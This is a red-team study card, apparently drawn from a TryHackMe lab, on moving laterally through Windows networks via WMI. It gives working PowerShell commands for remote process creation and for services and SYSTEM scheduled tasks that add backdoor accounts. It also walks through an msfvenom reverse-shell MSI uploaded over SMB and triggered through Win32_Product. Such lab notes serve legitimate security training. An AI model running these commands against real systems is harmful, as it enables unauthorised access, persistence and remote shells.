---
{"dg-publish":true,"permalink":"/cards/red-team/moving-laterally-using-wmi/"}
---

~ [[cards/red-team/lateral movement and pivoting\|lateral movement and pivoting]]
## Summary
---
**What it is:** Technique for performing remote process execution and administrative actions on `{TARGET}` via Windows Management Instrumentation (WMI).  
**Scope:** Covers WMI-based remote sessions, process creation, service manipulation, scheduled tasks, and MSI installation; excludes tooling syntax and any exploit-specific payloads.  
**Key Topics:** [[WMI\|WMI]], [[DCOM\|DCOM]], [[WinRM\|WinRM]], [[Win32_Process\|Win32_Process]], [[Windows Services\|Windows Services]], [[Scheduled Tasks\|Scheduled Tasks]], [[Lateral Movement\|Lateral Movement]]

## How it works
---
WMI provides a structured management interface that exposes system objects as manageable classes accessible over DCOM or WinRM. With valid credentials, an operator can create a remote CIM session and issue method calls that the OS executes natively—such as spawning processes, creating services, or registering tasks. Administrators use WMI for inventory, automation, and remote maintenance, and adversaries reuse the same pathways for stealthy lateral movement.

## Steps
---
Windows Management Instrumentation allows administrators to perform standard management tasks that attackers can abuse to perform lateral movement.

**Attacker objective:** Execute administrative actions or spawn a process on `{TARGET}` using authenticated WMI access.

**Conceptual workflow:**

1. Acquire valid credentials for `{USER}` and determine whether to connect via DCOM or WinRM based on the target’s configuration.
    
2. Establish a remote WMI/CIM session to `{TARGET}` and authenticate using appropriate session options.
    
3. Invoke WMI classes (e.g., `Win32_Process`, `Win32_Service`, or scheduling interfaces) to run `{PAYLOAD}` or create persistent task artifacts.
    
4. Optional: Transfer files through allowed channels (e.g., SMB admin shares) before calling WMI methods that reference local paths.
    
5. Monitor for session results (process exit codes, method return values) since WMI does not provide interactive output.
    
### Connecting to WMI From Powershell
---
You need to create a `PSCredential` object with your user and password:

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

You have two options to establish a WMI session using either of the following protocols:

- **DCOM:** RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP, just as explained when using sc.exe.
- **Wsman:** WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).

To establish a WMI session from Powershell, we can use the following commands and store the session on the $Session variable:

```C
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

The `New-CimSessionOption` cmdlet is used to configure the connection options for the WMI session, including the connection protocol. The options and credentials are then passed to the `New-CimSession` cmdlet to establish a session against a remote host.

### Remote Process Creation Using WMI
---
- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)  
        
- **Required Group Memberships:** Administrators

You can remotely spawn a process from Powershell by leveraging Windows Management Instrumentation (WMI), sending a WMI request to the Win32_Process class to spawn the process under the **session** (The code block above with `$Session`) we created before.

Essentially "use **$Session** (the WMI session that contains our credentials and protocol) to execute a process remotely":

```powershell
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```

Notice that WMI won't allow you to see the output of any command but will indeed create the required process silently.

### Creating Services Remotely with WMI
---
- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Administrators

You can create services with WMI through Powershell. To create a service called LegitService, we can use the following command:

Take note of the `$Session` variable:

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "LegitService";
DisplayName = "LegitService";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```

Obtain a handle on the service and start it:

```C
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'LegitService'"

Invoke-CimMethod -InputObject $Service -MethodName StartService
```

Finally, we can stop and delete the service with the following commands:

```C
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

### Create a Scheduled Task Remotely with WMI
---
- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Administrators

You can create and execute scheduled tasks by using some cmdlets available in Windows default installations:

```powershell
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

To delete the scheduled task after it has been used, we can use the following command:

```C
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

### Installing MSI packages through WMI
---
- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Administrators

MSI is a file format used for Windows installers. If you can copy an MSI package in any way to the target system, you can then use WMI to attempt to install it for us. Once the MSI file is in the target system, we can attempt to install it by invoking the `Win32_Product` class through WMI:

```C
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

You can achieve the same by us using wmic in legacy systems:

```C
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```

### Sample Workflow
---

 - **User:** ZA.TRYHACKME.COM\t1_corine.waters
- **Password:** Korine.1994

Create a malicious `.msi` package using msfvenom:

```C
msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > Leinstaller.msi
```

**Find a way to copy the payload to the target:** in this case the use of SMB:

```C
smbclient -c 'put Leinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
```

Since we copied our payload to the ADMIN$ share, it will be available at C:\Windows\ on the server.

```C
msf6 exploit(multi/handler) > set LHOST lateralmovement
msf6 exploit(multi/handler) > set LPORT 4445
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > exploit 
```

Then at the **Jump** machine:

```C
$username = 't1_corine.waters';
$password = 'Korine.1994';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

Then invoke the install method from the `Win32_Product` class to trigger the payload:

```C
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\Leinstaller.msi"; Options = ""; AllUsers = $false}
```

![lateral movement and pivoting-5.png](/img/user/cards/red-team/images/lateral%20movement%20and%20pivoting-5.png)